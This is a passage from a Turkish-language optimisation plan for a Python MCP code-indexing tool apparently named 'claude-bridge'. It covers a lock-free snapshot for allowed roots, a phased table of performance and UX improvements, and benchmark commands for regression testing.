**Tahmini etki:** Stack overflow riski tamamen ortadan kalkar. Büyük dosyalarda daha güvenilir.

### 9.9 Sorun: `allowed_roots()` Her Çağrıda Liste Kopyası Döndürüyor

**Dosya:** `config.py:73-75` ve `tool_utils.py:199-200`

```python
def allowed_roots() -> list[Path]:
    with _CONFIG_LOCK:
        return list(_CONFIG["allowed_roots"])  # ← HER ÇAĞRIDA YENİ LİSTE OLUŞTURUR
```

Bu fonksiyon `resolve_path`, `path_outside_project_details`, `set_active_project_dir`, `is_within_root` gibi birçok yerden çağrılıyor. Her çağrıda bir kilit alma + liste kopyalama işlemi yapılıyor.

### 9.10 Çözüm: Okuma İçin Lock Gerekmez (Immutable Snapshot)

```python
_ALLOWED_ROOTS_SNAPSHOT: list[Path] = []

def apply_config(...) -> None:
    global _ALLOWED_ROOTS_SNAPSHOT
    ...
    with _CONFIG_LOCK:
        _CONFIG["allowed_roots"] = resolved_allowed_roots
        _ALLOWED_ROOTS_SNAPSHOT = list(resolved_allowed_roots)  # snapshot oluştur

def allowed_roots() -> list[Path]:
    return _ALLOWED_ROOTS_SNAPSHOT  # kilit yok, kopya yok
```

**Tahmini etki:** Her `allowed_roots()` çağrısında lock + kopyalama maliyeti ortadan kalkar.

---

## 10. Önceliklendirilmiş Uygulama Planı

### Faz 1 — Hızlı Kazançlar (Düşük Zorluk)

| # | Değişiklik | Dosya | Etki | Efor |
|---|-----------|-------|------|------|
| 1.1 | Typer shell completion aktif et | `cli.py` + dokümantasyon | CLI UX iyileşir | Çok düşük |
| 1.2 | Custom autocomplete callback'leri ekle | `cli.py` | Parametre tamamlama | Düşük |
| 1.3 | `benchmarking.py` import'unu `cli.py`'den kaldır, fonksiyon içine taşı | `cli.py` | Startup ~200ms hızlanır | Çok düşük |
| 1.4 | `.gitignore` mtime-based cache ekle | `indexing.py` | Tekrarlı okuma azalır | Düşük |
| 1.5 | `git rev-parse` repo root cache ekle | `git_ops.py` | Her commit'te 1 subprocess azalır | Çok düşük |
| 1.6 | Tree-sitter parser cache ekle | `indexing.py` | 100× tekrarlı importlib çağrısı azalır | Çok düşük |
| 1.7 | `allowed_roots()` lock/kopya maliyetini kaldır | `config.py` + `tool_utils.py` | Sık çağrılı fonksiyon hızlanır | Çok düşük |
| 1.8 | Binary check'i ilk 8KB ile sınırla | `indexing.py` | I/O ~64x azalır | Çok düşük |
| 1.9 | `_iter_tree_sitter_nodes` özyinelemeyi stack'e çevir | `indexing.py` | Stack overflow riski ortadan kalkar | Çok düşük |
| 1.10 | Prompt kaydını `run_mcp_server()` içine taşı | `server.py` | Startup'ta 9 prompt oluşturma maliyeti azalır | Çok düşük |

### Faz 2 — Orta Vadeli İyileştirmeler (Orta Zorluk)

| # | Değişiklik | Dosya | Etki | Efor |
|---|-----------|-------|------|------|
| 2.1 | `server.py` import'larını lazy yap | `server.py` | Startup ~40-60% hızlanır | Orta |
| 2.2 | `stat()` çağrılarını birleştir | `indexing.py` | Index ~3x hızlanır | Orta |
| 2.3 | `rglob` → `os.walk` geçişi | `indexing.py` | Büyük repolarda ~10x hızlanma | Orta |
| 2.4 | Token'ları index sırasında pre-compute et | `indexing.py` + `relevance.py` | Query ~5-10x hızlanır | Orta |
| 2.5 | Shell timeout komut bazlı otomatik artırma | `shell_tools.py` + `config.py` | Uzun işlemler timeout olmaz | Düşük |
| 2.6 | `auto_commit` parametresi ekle + batch commit tool'u | `file_tools.py` + `server.py` | Gereksiz commit'ler azalır | Orta |
| 2.7 | Disk cache'den content'i çıkar | `indexing.py` | Cache dosyası boyutu %70-90 küçülür | Orta |

### Faz 3 — Uzun Vadeli Mimari İyileştirmeler

| # | Değişiklik | Dosya | Etki | Efor |
|---|-----------|-------|------|------|
| 3.1 | Full content yerine token seti sakla | `indexing.py` + `relevance.py` | Bellek %70-90 azalır | Orta |
| 3.2 | `haystacks` lowercase pre-compute | `relevance.py` | Query CPU azalır | Düşük |
| 3.3 | Incremental indexing (sadece değişen dosyalar) | `indexing.py` | Tekrarlı sorgularda ~sıfır maliyet | Yüksek |
| 3.4 | Disk cache'i token-based yapıya geçir | `indexing.py` | Disk cache boyutu küçülür | Orta |
| 3.5 | MCP tool olarak `autocomplete` ekle | `server.py` | Claude Desktop'ta öneri | Orta |
| 3.6 | `mcp_server.py` compat katmanını basitleştir | `mcp_server.py` | Gereksiz import zinciri kırılır | Düşük |
| 3.7 | `.bridgeignore` dosya deseni desteği | `tool_utils.py` + `config.py` | Kullanıcı özel engelleme listesi tanımlayabilir | Orta |
| 3.8 | Shell komut izin listesi (allowlist) yaklaşımı | `shell_tools.py` | Güvenlik açıklarını kapatır | Yüksek |
| 3.9 | Progress/günlük çıktısı (stderr) | Birden çok dosya | Uzun işlemlerde UX iyileşir | Düşük |

---

## Ek Notlar

### Test Stratejisi

Her faz sonrasında:
```bash
# Mevcut benchmark komutu ile regresyon kontrolü:
claude-bridge benchmark --project-dir /path/to/large/repo --query "authentication flow" --repeats 5

# Cache hit/miss oranlarını doğrulamak için:
claude-bridge benchmark --project-dir . --query "MCP server startup" --repeats 10 --json
```

### Geriye Uyumluluk

- Lazy import geçişi mevcut public API'yi değiştirmez
- Pre-computed token'lar ek alan olarak eklenebilir, mevcut `content` alanı korunabilir (geriye uyumlu)
- `os.walk` geçişi `iter_source_files` imzasını değiştirmez
